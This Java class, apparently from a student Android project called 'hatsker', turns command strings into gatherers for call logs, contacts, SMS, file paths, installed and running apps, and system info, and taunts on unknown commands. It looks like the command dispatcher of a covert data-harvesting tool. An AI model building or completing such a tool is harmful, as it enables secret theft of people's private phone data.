package com.example.student.hatsker;

import android.content.Context;
import android.util.Log;


public class GathererBuilder {

    private final String ALL_INFO_GATHERER = "allInfo";
    private final String CALL_LOG_GATHERER = "callLog";
    private final String CONTACTS_GATHERER = "contacts";
    private final String FILES_PATHS_GATHERER = "filePaths";
    private final String INSTALLED_APPS_GATHERER = "installedApps";
    private final String RUNNING_APPS_GATHERER = "runningApps";
    private final String SMS_GATHERER = "sms";
    private final String SYSTEM_INFO_GATHERER = "systemInfo";

    public Gatherer build(String cmd, Context context)
    {

        Log.i("Builder", cmd);

        switch (cmd)
        {

            case CALL_LOG_GATHERER: return new CallLogGatherer(context);

            case CONTACTS_GATHERER: return new ContactsGatherer(context);

            case FILES_PATHS_GATHERER: return new FilesPathsGatherer(context);

            case INSTALLED_APPS_GATHERER: return new InstalledAppsGatherer(context);

            case RUNNING_APPS_GATHERER: return new RunningAppsGatherer(context);

            case SMS_GATHERER: return new SmsGatherer(context);

            case SYSTEM_INFO_GATHERER: return new SystemInfoGatherer(context);

            default: return new Gatherer() {
                @Override
                public String getInfo() {
                    return "do u think u r right, maboy???";
                }
            };
        }

    }
}
